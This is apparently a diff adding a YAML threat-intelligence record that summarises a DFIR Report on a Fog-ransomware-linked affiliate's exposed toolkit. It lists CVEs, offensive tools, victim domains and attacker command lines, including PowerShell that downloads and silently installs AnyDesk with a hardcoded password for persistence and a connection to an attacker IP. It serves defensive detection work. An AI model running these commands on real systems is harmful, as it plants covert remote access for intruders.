@@ -1,0 +1,103 @@
+title: Navigating Through The Fog
+description: An open directory associated with a ransomware affiliate, likely linked
+  to the Fog ransomware group, was discovered in December 2024. It contained tools
+  and scripts for reconnaissance, exploitation, lateral movement, and persistence.
+attribution: ''
+malware_families: []
+cves:
+- CVE-2020-1472
+- CVE-2021-42278
+- CVE-2021-42287
+ttps:
+  processes:
+  - AnyDesk.exe
+  - netextender
+  - cmd.exe
+  - C:\ProgramData\AnyDesk.exe
+  - sliver-client_linux
+  - powercat.ps1
+  command_lines:
+  - netextender <target IP address> username <target username> password <username
+    password> domain <target domain name> always-trust .
+  - cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win
+    --silent
+  - cmd.exe /c echo Admin#123 | C:\ProgramData\anydesk.exe --set-password
+  - cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+  powershell:
+  - mkdir "C:\ProgramData\AnyDesk"
+  - $clnt = new-object System.Net.WebClient
+  - $url = "http://download.anydesk.com/AnyDesk.exe"
+  - $file = "C:\ProgramData\AnyDesk.exe"
+  - $clnt.DownloadFile($url,$file)
+  - cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win
+    --silent
+  - cmd.exe /c echo Admin#123 | C:\ProgramData\anydesk.exe --set-password
+  - cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+  scripts:
+  - sonic_scan/main.py
+  - any.ps1
+  - powercat.ps1
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - AnyDesk.exe -> 194.48.154.79:31337
+  file_activity:
+  - .bash_history
+  - .bashrc
+  - .cache/
+  - .config/
+  - .gnupg/
+  - .local/
+  - .nxc/
+  - .profile
+  - .sliver/
+  - .sliver-client/
+  - .ssh/
+  - .wget-hsts
+  - .Xauthority
+  - .xorgxrdp.10.log
+  - .xsession-errors
+  - 20241121150831_Certipy.zip
+  - any.ps1
+  - AnyDesk.exe
+  - Certipy/
+  - Desktop/
+  - Documents/
+  - DonPAPI-1.0.0/
+  - Downloads/
+  - Music/
+  - noPac/
+  - orpheus/
+  - ouroverde.net.br/
+  - Pachine/
+  - Pictures/
+  - powercat.ps1
+  - Public/
+  - sliver-client_linux
+  - sliver-client_linux.sig
+  - sliver-server
+  - sliver-server_linux.sig
+  - slv.bin
+  - snap/
+  - sonic_scan/
+  - sonic_scan.zip
+  - Templates/
+  - thinclient_drives/
+  - v1.0.0.zip
+  - Videos/
+  - zer0dump/
+  persistence:
+  - AnyDesk installed with Admin#123 password set for remote access
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - fourlis.net
+  - ouroverde.net.br
+  urls: []
+authors:
+- DFIR Reports Threat Intel Group
+reference: https://thedfirreport.com/2025/04/28/navigating-through-the-fog
+date_of_publication: April 28, 2025
+file_creation_date: May 14, 2026
